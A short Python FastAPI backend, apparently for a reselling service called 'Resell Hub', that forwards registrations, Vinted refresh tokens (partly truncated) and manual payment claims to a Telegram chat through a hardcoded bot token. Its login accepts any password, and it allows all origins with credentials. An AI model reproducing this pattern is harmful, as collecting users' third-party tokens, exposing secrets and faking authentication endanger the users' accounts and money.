import requests
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

app = FastAPI(title="Resell Hub API")

# Настройка CORS для работы с фронтендом Vercel
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = "8758957061:AAFV_HykyO1-CBgf2J_aNuxGZPYoXdo-sDw"
TELEGRAM_CHAT_ID = "7238536114"

def send_telegram_alert(message: str):
    """Отправка уведомлений в ваш Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload, timeout=5)
        response.raise_for_status()
    except Exception as e:
        print(f"Ошибка отправки сообщения в Telegram: {e}")

# Модели валидации данных
class AuthModel(BaseModel):
    email: str
    password: str

class OfferModel(BaseModel):
    vinted_url: str
    offer_price: float
    refresh_token: str

class PaymentConfirmModel(BaseModel):
    service_name: str
    amount: str
    user_contact: str
    receipt_info: str

# Корневой маршрут для проверки работы бэкенда
@app.get("/")
async def root():
    return {"status": "ok", "message": "Resell Hub API is running"}

# 1. Регистрация и Авторизация
@app.post("/api/auth/register")
async def register(data: AuthModel):
    send_telegram_alert(f"👤 <b>Новая регистрация на сайте!</b>\nEmail: <code>{data.email}</code>")
    return {"status": "success", "message": "Регистрация успешна!"}

@app.post("/api/auth/login")
async def login(data: AuthModel):
    return {"status": "success", "message": "Успешный вход!"}

# 2. Отправка оффера Vinted
@app.post("/api/vinted/send-offer")
async def send_offer(data: OfferModel):
    msg = (
        f"⚡ <b>Запрос на отправку оффера Vinted!</b>\n\n"
        f"🔗 <b>Ссылка:</b> {data.vinted_url}\n"
        f"💰 <b>Предложенная цена:</b> €{data.offer_price}\n"
        f"🔑 <b>Token:</b> <code>{data.refresh_token[:15]}...</code>"
    )
    send_telegram_alert(msg)
    return {"status": "success", "message": f"Оффер €{data.offer_price} отправлен на обработку!"}

# 3. Подтверждение оплаты (SMS / Legit Check / Community)
@app.post("/api/pay/manual-confirm")
async def manual_confirm(data: PaymentConfirmModel):
    msg = (
        f"🚨 <b>НОВАЯ ЗАЯВКА НА ОПЛАТУ!</b>\n\n"
        f"📦 <b>Услуга:</b> {data.service_name}\n"
        f"💵 <b>Сумма:</b> {data.amount}\n"
        f"👤 <b>Контакт клиента:</b> {data.user_contact}\n"
        f"🧾 <b>Чек / Отправитель:</b> {data.receipt_info}"
    )
    send_telegram_alert(msg)
    return {"status": "success", "message": "Заявка принята! Ожидайте подтверждения."}
